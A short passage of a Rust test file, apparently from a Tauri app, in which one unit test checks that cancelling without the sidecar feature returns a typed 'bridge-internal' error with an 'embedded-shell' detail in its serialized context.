    /// Pre-FIX-2 this asserted the exact string; post-FIX-2 we assert the
    /// typed code so the TS `switch` statement has something to hit.
    #[cfg(not(feature = "sidecar"))]
    #[test]
    fn quanta_cancel_block_without_sidecar_has_graceful_code() {
        // The fallback arm constructs this directly; we pin the code shape
        // so a future edit that changes the label shows up red.
        let err = TauriError::bridge_internal("cancel not supported in embedded-shell mode");
        assert_eq!(err.code, ErrorCode::BridgeInternal);
        // `user_message` is the UI-safe generic; the detail lives in context.
        let v = serde_json::to_value(&err).unwrap();
        assert_eq!(v["code"], "bridge-internal");
        assert!(v["context"]["detail"]
            .as_str()
            .unwrap()
            .contains("embedded-shell"));
    }
}
